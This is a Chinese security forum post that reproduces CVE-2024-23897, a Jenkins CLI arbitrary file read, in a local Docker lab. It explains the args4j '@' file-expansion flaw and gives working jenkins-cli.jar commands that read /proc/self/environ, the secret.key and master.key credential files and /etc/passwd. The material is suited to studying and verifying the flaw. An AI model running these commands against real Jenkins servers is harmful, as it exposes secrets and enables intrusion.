---
title: Jenkins CLI 接口任意文件读取漏洞（CVE-2024-23897）
url: https://forum.butian.net/share/3605
source: 奇安信攻防社区
date: 2024-07-11
fetch_date: 2025-10-06T17:41:24.663550
---

# Jenkins CLI 接口任意文件读取漏洞（CVE-2024-23897）

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### Jenkins CLI 接口任意文件读取漏洞（CVE-2024-23897）

Jenkins CLI 接口任意文件读取漏洞（CVE-2024-23897）
Jenkins是一个开源的自动化服务器。
Jenkins使用args4j来解析命令行输入，并支持通过HTTP、Websocket等协议远程传入命令行参数。args4j中...

Jenkins CLI 接口任意文件读取漏洞（CVE-2024-23897）
======================================
Jenkins是一个开源的自动化服务器。
Jenkins使用[args4j](https://github.com/kohsuke/args4j)来解析命令行输入，并支持通过HTTP、Websocket等协议远程传入命令行参数。args4j中用户可以通过`@`字符来加载任意文件，这导致攻击者可以通过该特性来读取服务器上的任意文件。
该漏洞影响Jenkins 2.441及以前的版本。
参考链接：
- <https://www.jenkins.io/security/advisory/2024-01-24/#SECURITY-3314>
- <https://mp.weixin.qq.com/s/2a4NXRkrXBDhcL9gZ3XQyw>
漏洞环境
----
执行如下命令启动一个Jenkins server 2.441：
```php
docker compose up -d
```
服务启动后，访问`http://your-ip:8080/`即可查看到Jenkins登录页面，默认的管理员帐号密码为`admin`和`vulhub`。
漏洞复现
----
利用该漏洞可以直接使用官方提供的命令行客户端，在`http://localhost:8080/jnlpJars/jenkins-cli.jar`下载。
使用该工具读取目标服务器的`/proc/self/environ`文件，可以找到Jenkins的基础目录，`JENKINS\_HOME=/var/jenkins\_home`：
```php
java -jar jenkins-cli.jar -s http://localhost:8080/ -http help 1 "@/proc/self/environ"
```
![](https://oss-yg-cztt.yun.qianxin.com/butian-public/f12426631a593f2490eedac7c52cde272bb04076695ae.jpg)
然后，可在该目录下读取敏感文件，如`secrets.key` or `master.key`（匿名情况下，只能通过命令行的报错读取文件的第一行）：
```php
java -jar jenkins-cli.jar -s http://localhost:8080/ -http help 1 "@/var/jenkins\_home/secret.key"
```
![](https://oss-yg-cztt.yun.qianxin.com/butian-public/f837378f1623e9eb3b45913f039ff64351fa7103c368f.jpg)
```php
java -jar jenkins-cli.jar -s http://localhost:8080/ -http help 1 "@/var/jenkins\_home/secrets/master.key"
```
![](https://oss-yg-cztt.yun.qianxin.com/butian-public/f3051599da0c46dc01359ec64bf6fc2a78325c68ed1f2.jpg)
因为开启了“匿名用户可读”选项，你也可以直接使用`connect-node`命令读取完整文件内容：
```php
java -jar jenkins-cli.jar -s http://localhost:8080/ -http connect-node "@/etc/passwd"
```
![](https://oss-yg-cztt.yun.qianxin.com/butian-public/f305614eebe23bc5f3980925314462d3e132615b5eb39.jpg)

* 发表于
* 阅读 ( 2501 )
* 分类：[Web服务器](https://forum.butian.net/community/Web111)

0 推荐
 收藏

## 0 条评论

请先 [登录](https://forum.butian.net/login) 后评论

[![带头大哥](https://forum.butian.net/static/images/default_avatar.jpg)](https://forum.butian.net/people/84)

[带头大哥](https://forum.butian.net/people/84)

50 篇文章

[奇安信攻防社区](https://forum.butian.net)|
联系我们

|
[sitemap](https://forum.butian.net/sitemap)

Copyright © 2013-2023 BUTIAN.NET 版权所有 [京ICP备18014330号-2](https://beian.miit.gov.cn/#/Integrated/index)

×

#### 发送私信

请先 [登录](https://forum.butian.net/login) 后发送私信

×

#### 举报此文章

垃圾广告信息：
广告、推广、测试等内容

违规内容：
色情、暴力、血腥、敏感信息等内容

不友善内容：
人身攻击、挑衅辱骂、恶意行为

其他原因：
请补充说明

举报原因:

取消
举报

×

#### ![带头大哥](https://forum.butian.net/static/images/default_avatar.jpg)

如果觉得我的文章对您有用，请随意打赏。你的支持将鼓励我继续创作！

![]()

---